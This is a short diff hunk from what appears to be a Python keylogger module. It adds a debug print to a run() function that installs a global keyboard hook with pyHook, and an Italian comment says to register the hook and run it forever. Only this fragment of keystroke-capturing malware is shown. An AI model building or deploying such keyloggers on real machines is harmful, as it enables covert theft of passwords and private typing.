@@ -87,6 +87,7 @@ def KeyStroke(event):
 
 
 def run():
+    print("[In KeyLogger module]")
     kl = pyHook.HookManager()
     kl.KeyDown = KeyStroke
     #registra hook ed eseguilo per sempre
